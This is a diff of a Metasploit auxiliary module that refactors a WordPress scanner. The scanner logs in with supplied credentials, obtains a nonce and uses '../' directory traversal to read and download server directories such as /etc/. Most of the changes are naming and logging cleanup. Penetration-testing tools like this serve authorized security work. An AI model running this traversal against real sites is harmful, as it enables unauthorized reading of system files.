@@ -1,16 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'json'
 require 'nokogiri'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -40,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('DIRPATH', [true, 'The path to the directory to read', '/etc/']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ], self.class)
+      ])
   end
 
   def user
@@ -67,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res && res.redirect? && res.redirection
       location = res.redirection
-      print_status("#{peer} - Following redirect to #{location}")
+      print_status("Following redirect to #{location}")
       res = send_request_cgi(
         'uri'    => location,
         'method' => 'GET',
@@ -93,20 +91,21 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    vprint_status("#{peer} - Trying to login as: #{user}")
+    vprint_status("Trying to login as: #{user}")
     cookie = wordpress_login(user, password)
     if cookie.nil?
-      print_error("#{peer} - Unable to login as: #{user}")
+      print_error("Unable to login as: #{user}")
       return
     end
+    store_valid_credential(user: user, private: password, proof: cookie)
 
-    vprint_status("#{peer} - Trying to get nonce...")
+    vprint_status("Trying to get nonce...")
     nonce = get_nonce(cookie)
     if nonce.nil?
-      print_error("#{peer} - Can not get nonce after login")
+      print_error("Can not get nonce after login")
       return
     end
-    vprint_status("#{peer} - Got nonce: #{nonce}")
+    vprint_status("Got nonce: #{nonce}")
 
     traversal = "../" * datastore['DEPTH']
     filename = datastore['DIRPATH']
@@ -144,9 +143,9 @@ class Metasploit3 < Msf::Auxiliary
         fname
       )
 
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      print_error("#{peer} - Nothing was downloaded. You can try to change the DIRPATH.")
+      print_error("Nothing was downloaded. You can try to change the DIRPATH.")
     end
   end
 end
